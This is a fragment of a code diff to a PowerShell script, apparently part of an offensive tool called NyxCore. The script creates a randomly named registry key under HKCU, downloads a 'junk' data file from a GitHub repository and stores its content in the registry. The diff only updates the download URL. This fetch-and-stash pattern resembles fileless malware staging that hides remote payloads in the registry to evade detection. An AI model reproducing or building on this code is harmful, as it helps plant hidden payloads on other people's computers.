@@ -3,7 +3,7 @@ $regPath = "HKCU:\Software\" + (-join ((65..90) + (97..122) | Get-Random -Count 
 New-Item -Path $regPath -Force | Out-Null
 
 # Download the junk file from GitHub
-$junkUrl = "https://raw.githubusercontent.com/h41th3m0x/NyxCore/refs/heads/main/NTUSER_junk.dat"
+$junkUrl = "https://raw.githubusercontent.com/h41th3m0x/NyXC0r3-v1.0/refs/heads/main/Data/NTUSER_junk.dat"
 $junkContent = [System.Text.Encoding]::UTF8.GetString((New-Object Net.WebClient).DownloadData($junkUrl))
 
 # Save to registry with fixed random name
@@ -58,4 +58,5 @@ foreach ($match in $matches) {
         }
         catch {}
     }
+
 }
